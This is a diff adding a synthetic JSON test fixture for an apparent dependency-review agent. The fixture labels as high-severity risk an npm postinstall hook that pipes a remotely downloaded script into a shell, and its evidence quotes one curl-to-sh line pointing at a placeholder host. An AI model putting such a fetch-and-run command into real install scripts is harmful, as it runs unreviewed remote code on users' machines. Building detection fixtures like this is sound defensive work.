@@ -1,0 +1,26 @@
+{
+  "fixture": "risky/dep-risky-remote-install-script.json",
+  "label": "risky",
+  "summary": "Synthetic risky example for the proposed dependency fixture criteria. No real package or network operation is required.",
+  "score_human_review": false,
+  "findings": [
+    {
+      "agent": "dependency",
+      "title": "Install script executes remote code",
+      "description": "An npm postinstall hook pipes a downloaded script into a shell during installation.",
+      "severity": "high",
+      "recommendation": "Remove remote execution from the install hook; review and version any required setup code locally.",
+      "evidence": [
+        {
+          "file_path": "package.json",
+          "line_start": 5,
+          "line_end": 5,
+          "observation": "curl -fsSL https://example.invalid/setup.sh | sh"
+        }
+      ],
+      "confidence": 1.0,
+      "uncertainty": [],
+      "requires_human_review": false
+    }
+  ]
+}
